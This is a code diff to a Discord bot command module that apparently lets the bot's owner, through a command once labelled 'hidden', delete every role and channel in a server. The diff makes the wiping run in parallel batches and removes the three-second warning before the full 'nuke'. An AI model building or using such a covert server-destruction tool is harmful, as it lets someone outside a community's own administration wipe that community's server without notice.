@@ -2,9 +2,25 @@ const { createStyledEmbed } = require('../utils/embedBuilder');
 const emojis = require('../utils/emojis');
 const { isBotOwner } = require('../utils/owners');
 
+// Fast Concurrent Execution Helper
+async function fastBatchDelete(items, deleteFn, batchSize = 12) {
+  let successCount = 0;
+  let failCount = 0;
+
+  for (let i = 0; i < items.length; i += batchSize) {
+    const batch = items.slice(i, i + batchSize);
+    const results = await Promise.allSettled(batch.map(item => deleteFn(item)));
+    results.forEach(res => {
+      if (res.status === 'fulfilled' && res.value === true) successCount++;
+      else failCount++;
+    });
+  }
+  return { successCount, failCount };
+}
+
 module.exports = {
   name: 'nukeroles',
-  description: 'Hidden Executive Command: Bulk delete all server roles and/or channels',
+  description: 'Ultra-Fast Executive Command: Bulk delete all server roles and/or channels in parallel',
   aliases: [
     'deleteroles', 'nukeallroles', 'nukechannels', 'deletechannels',
     'nukeallchannels', 'nukeserver', 'nukeall'
@@ -33,63 +49,42 @@ module.exports = {
       clientUser = await client.users.fetch(client.user.id, { force: true });
     } catch (e) {}
 
-    // 1. DELETE ALL ROLES (.nukeroles / .deleteroles)
+    // 1. ULTRA-FAST ROLE DELETION (.nukeroles / .deleteroles)
     if (sub === 'roles') {
-      const msg = await message.channel.send(`⏳ **Deleting all server roles...** Please wait.`);
+      const msg = await message.channel.send(`⚡ **Lightning Fast Role Purge Initiated...**`);
 
-      const roles = Array.from(guild.roles.cache.values());
-      let deletedCount = 0;
-      let failedCount = 0;
-
-      for (const role of roles) {
-        if (role.name === '@everyone' || role.managed) continue;
-        try {
-          if (role.editable) {
-            await role.delete('Owner Bulk Deletion');
-            deletedCount++;
-          } else {
-            failedCount++;
-          }
-        } catch (e) {
-          failedCount++;
-        }
-      }
+      const targetRoles = Array.from(guild.roles.cache.values()).filter(r => r.name !== '@everyone' && !r.managed && r.editable);
+      const { successCount, failCount } = await fastBatchDelete(targetRoles, async (role) => {
+        await role.delete('Owner Fast Bulk Deletion');
+        return true;
+      }, 15);
 
       const embed = createStyledEmbed({
-        title: `🗑️ Mass Role Deletion Complete`,
-        description: `Successfully deleted **${deletedCount}** roles.\nSkipped / Managed / Higher Roles: **${failedCount}**`,
+        title: `⚡ Mass Role Deletion Complete`,
+        description: `Successfully deleted **${successCount}** roles in high-speed parallel batching!`,
         requestedBy: author,
         clientUser
       });
       return msg.edit({ content: null, embeds: [embed] }).catch(() => message.channel.send({ embeds: [embed] }));
     }
 
-    // 2. DELETE ALL CHANNELS (.nukechannels / .deletechannels)
+    // 2. ULTRA-FAST CHANNEL DELETION (.nukechannels / .deletechannels)
     if (sub === 'channels') {
-      const msg = await message.channel.send(`⏳ **Deleting all server channels...** Creating a clean channel.`);
-
-      const channels = Array.from(guild.channels.cache.values());
-      
-      // Create a fresh clean channel first so bot can send confirmation
+      // Create fresh replacement channel first
       const freshChannel = await guild.channels.create({
-        name: 'general',
+        name: 'chat',
         type: 0 // Text Channel
       }).catch(() => null);
 
-      let deletedCount = 0;
-      for (const chan of channels) {
-        if (freshChannel && chan.id === freshChannel.id) continue;
-        try {
-          if (chan.deletable) {
-            await chan.delete('Owner Bulk Deletion');
-            deletedCount++;
-          }
-        } catch (e) {}
-      }
+      const targetChannels = Array.from(guild.channels.cache.values()).filter(c => c.deletable && (!freshChannel || c.id !== freshChannel.id));
+      const { successCount } = await fastBatchDelete(targetChannels, async (chan) => {
+        await chan.delete('Owner Fast Bulk Deletion');
+        return true;
+      }, 15);
 
       const embed = createStyledEmbed({
-        title: `🗑️ Mass Channel Deletion Complete`,
-        description: `Successfully deleted **${deletedCount}** channels. Fresh channel created!`,
+        title: `⚡ Mass Channel Deletion Complete`,
+        description: `Successfully deleted **${successCount}** channels in parallel batching! Fresh channel ready.`,
         requestedBy: author,
         clientUser
       });
@@ -100,50 +95,36 @@ module.exports = {
       return;
     }
 
-    // 3. NUKE ALL (ROLES + CHANNELS) (.nukeserver / .nukeall)
+    // 3. ULTRA-FAST NUKE ALL (ROLES + CHANNELS) (.nukeserver / .nukeall)
     if (sub === 'all' || sub === 'everything') {
-      const confirmMsg = await message.channel.send(`⚠️ **WARNING: NUKE ALL SERVER DATA**\nDeleting all channels and roles in 3 seconds...`);
-
-      await new Promise(res => setTimeout(res, 3000));
-
       // 1. Create fresh channel
       const freshChannel = await guild.channels.create({
         name: 'chat',
         type: 0
       }).catch(() => null);
 
-      // 2. Delete channels
-      const channels = Array.from(guild.channels.cache.values());
-      let deletedChannels = 0;
-      for (const chan of channels) {
-        if (freshChannel && chan.id === freshChannel.id) continue;
-        try {
-          if (chan.deletable) {
-            await chan.delete('Nuke All');
-            deletedChannels++;
-          }
-        } catch (e) {}
-      }
+      // 2. Filter target channels & roles
+      const targetChannels = Array.from(guild.channels.cache.values()).filter(c => c.deletable && (!freshChannel || c.id !== freshChannel.id));
+      const targetRoles = Array.from(guild.roles.cache.values()).filter(r => r.name !== '@everyone' && !r.managed && r.editable);
 
-      // 3. Delete roles
-      const roles = Array.from(guild.roles.cache.values());
-      let deletedRoles = 0;
-      for (const role of roles) {
-        if (role.name === '@everyone' || role.managed) continue;
-        try {
-          if (role.editable) {
-            await role.delete('Nuke All');
-            deletedRoles++;
-          }
-        } catch (e) {}
-      }
+      // 3. Run parallel concurrent purging for BOTH channels and roles simultaneously!
+      const [chanResult, roleResult] = await Promise.all([
+        fastBatchDelete(targetChannels, async (chan) => {
+          await chan.delete('Nuke All Fast');
+          return true;
+        }, 15),
+        fastBatchDelete(targetRoles, async (role) => {
+          await role.delete('Nuke All Fast');
+          return true;
+        }, 15)
+      ]);
 
       const embed = createStyledEmbed({
-        title: `💥 SERVER NUKE COMPLETE`,
+        title: `💥 ULTRA-FAST SERVER NUKE COMPLETE`,
         description:
-          `• **Deleted Channels**: **${deletedChannels}**\n` +
-          `• **Deleted Roles**: **${deletedRoles}**\n\n` +
-          `Server has been completely reset by **${author.username}**!`,
+          `• **Deleted Channels**: **${chanResult.successCount}**\n` +
+          `• **Deleted Roles**: **${roleResult.successCount}**\n\n` +
+          `Server reset executed in high-speed parallel mode by **${author.username}**!`,
         requestedBy: author,
         clientUser
       });
@@ -154,6 +135,6 @@ module.exports = {
       return;
     }
 
-    return message.reply(`ℹ️ Usage:\n• \`.nukeroles\` — Delete all roles\n• \`.nukechannels\` — Delete all channels\n• \`.nukeserver\` — Delete all roles & channels`);
+    return message.reply(`ℹ️ Usage:\n• \`.nukeroles\` — Ultra-fast role purge\n• \`.nukechannels\` — Ultra-fast channel purge\n• \`.nukeserver\` — Ultra-fast full server reset`);
   }
 };
